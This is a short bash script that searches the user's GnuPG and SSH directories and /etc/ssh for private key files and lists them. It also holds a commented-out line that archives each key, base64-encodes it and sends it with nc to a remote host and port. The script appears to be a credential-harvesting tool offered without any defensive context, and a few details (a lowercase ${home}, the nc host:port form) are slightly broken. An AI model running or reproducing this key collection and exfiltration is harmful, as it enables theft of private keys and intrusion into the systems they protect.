#!/bin/bash
#. kukolny.cfg
dir_list=( "${HOME}"/.gnupg "${home}"/.ssh /etc/ssh )
keys=$(for dir in "${dir_list[@]}"; do find "${dir}" -type f -exec grep -l "PRIVATE" '{}' \;;done)
for k in $keys; do
    echo "$k"
    #tar -cf- - "$k"|base64 -w0|nc $remote_host:$remote_port
done
